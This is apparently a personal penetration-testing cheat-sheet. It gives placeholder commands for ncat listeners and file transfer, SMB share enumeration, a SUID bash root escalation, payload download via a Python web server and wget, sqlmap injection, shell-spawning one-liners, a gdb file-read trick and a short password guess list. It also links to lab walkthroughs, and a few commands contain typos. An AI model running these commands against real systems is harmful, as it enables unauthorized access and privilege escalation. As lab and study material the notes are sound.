# HackNotes 【第一】🐱‍💻 my personal pentest notes

## Introduction to Cyber Security

Cybersecurity is the body of technologies, processes and practices designed to protect networks, computers, programs and data from attack, damage or unauthorized access

## Basics

### nmap-ncat
##### Listen to Inbound Connections
`ncat -l [PORT]`
##### Connect to Remote System
`ncat [IP] [PORT]`
##### Copy Files Using ncat
Receiver: `ncat -l [PORT] > file.ext`
Sender: `ncat [IP] [PORT] --send-only < file.ext`

### SSH
ssh []@[] -i []
permission too open
`chmod 600 []`

### SMB
`smbclient -L [IP]`
`smbclient \\\\[IP]\\\[SHARENAME]`
##### try for write permission
`mkdir [DIR]`

##### Free root
-bash-5.0$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /bin/bash
type
`/bin/bash -p`

### SCP (Secure Copy)
##### Basic Syntax
`scp [SOURCE_FILE_PATH] [DESTINATION_FILE_PATH]`
##### Sending File From Remote Host to Local Host
`scp [user]@[IP]:/[PATH]/[PATH]/file.ext outputfile.ext`

### wget
##### Prepate the HTTP Server
`python-m http.server [PORT]`
##### On the Target Machine
`wget [IP/URL]:[PORT] -O filename.ext`

###SQL injection
#####sqlmap
`sqlmap --batch -u "[URL]" --data "[DATA]" --cookie "[]" -p [PARAM] --level=5 --dbms=[DB] --technique=T --dbs`

### Spawning 🐚
##### python
`python -c 'import pty; pty.spawn("/bin/sh")'`
##### echo
`echo 'os.system('/bin/bash')'`
##### bash
`/bin/bash -i`
##### sh
`/bin/sh -i`

### Useful Trickeries
##### gdb file read 
`gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit`

### Bad Passwords worth to try
- qazwsxedc
- p4ssw0rd

## Searching for Subdomains
### theHarvester
`theHarvester --domain [DOMAIN] --limit 1000 --source all`

## Misc

### WPScan
`wpscan --url [IP/URL] --api-token [TOKEN]`

### Encode Base64
the file name is base64.txt
`cat base64.txt | base64 -d`

### Fix Kali Linux WSL ping problem
`sudo setcap cap_net_raw+ep /usr/bin/ping`

### Easy Pentest Steps
#### Black-Box

## Learn From Walkthroughs
- https://www.hackingarticles.in/seppuku1-vulnhub-walkthrough/ (brute forcing basic authentication)
- https://falconspy.medium.com/infosec-prep-oscp-vulnhubwalkthrough-a09519236025 (oscp material)
- https://offsecdeer.gitlab.io/post/vulnhub-walkthrough-dawn/ (SMB)
